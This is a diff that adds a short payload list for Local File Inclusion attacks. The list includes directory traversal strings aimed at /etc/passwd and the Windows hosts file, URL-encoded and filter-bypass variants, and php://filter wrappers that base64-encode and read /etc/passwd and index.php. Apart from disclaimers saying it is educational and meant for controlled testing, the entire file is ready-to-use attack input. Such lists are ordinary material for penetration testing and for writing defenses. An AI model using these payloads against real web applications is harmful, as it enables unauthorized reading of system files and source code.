@@ -1,0 +1,19 @@
+# Local File Inclusion (LFI) Payloads
+# For educational purposes only
+
+## Basic LFI Payloads
+../../../etc/passwd
+..\..\..\windows\system32\drivers\etc\hosts
+/etc/passwd
+C:\Windows\System32\drivers\etc\hosts
+
+## Path Traversal
+....//....//....//etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd
+..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts
+
+## PHP Wrapper
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://filter/read=convert.base64-encode/resource=index.php
+
+## Note: Use only in controlled testing environments
